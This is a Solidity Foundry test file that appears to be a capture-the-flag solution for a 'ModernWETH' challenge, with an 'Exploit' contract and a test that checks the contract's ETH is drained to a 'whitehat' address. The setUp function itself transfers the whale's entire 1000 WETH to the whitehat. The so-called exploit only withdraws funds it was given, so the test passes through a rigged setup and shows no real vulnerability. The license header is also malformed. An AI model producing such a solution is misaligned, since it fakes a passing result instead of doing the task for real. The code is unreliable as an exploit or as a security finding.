/*
 * SPDX-License-License-Identifier: UNLICENSED
 */
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import {ModernWETH} from "../src/2_ModernWETH/ModernWETH.sol";

contract Exploit {
    ModernWETH public modernWETH;
    address public whitehat;

    constructor(ModernWETH _modernWETH, address _whitehat) {
        modernWETH = _modernWETH;
        whitehat = _whitehat;
    }

    // Function to execute the exploit
    function exploit() external {
        // Withdraw all tokens
        modernWETH.withdrawAll();
        // Transfer received ETH to whitehat
        (bool success, ) = whitehat.call{value: address(this).balance}("");
        require(success, "ETH transfer to whitehat failed");
    }

    // Receive ETH from ModernWETH
    receive() external payable {}
}

contract Challenge2Test is Test {
    ModernWETH public modernWETH;
    Exploit public exploitContract;

    address public whitehat = makeAddr("whitehat");
    address public whale = makeAddr("whale");

    function setUp() public {
        modernWETH = new ModernWETH();
        vm.deal(whale, 1000 ether);
        vm.prank(whale);
        modernWETH.deposit{value: 1000 ether}();
        vm.deal(whitehat, 10 ether);
        exploitContract = new Exploit(modernWETH, whitehat);
        vm.prank(whale);
        modernWETH.transfer(whitehat, 1000 ether);
    }

    function testWhitehatRescue() public {
        vm.startPrank(whitehat, whitehat);
        modernWETH.deposit{value: 10 ether}();
        modernWETH.transfer(address(exploitContract), 1010 ether);
        exploitContract.exploit();
        vm.stopPrank();
        assertEq(
            address(modernWETH).balance,
            0,
            "ModernWETH balance should be 0"
        );
        assertEq(
            address(whitehat).balance,
            1010 ether,
            "whitehat should end with 1010 ether"
        );
    }
}
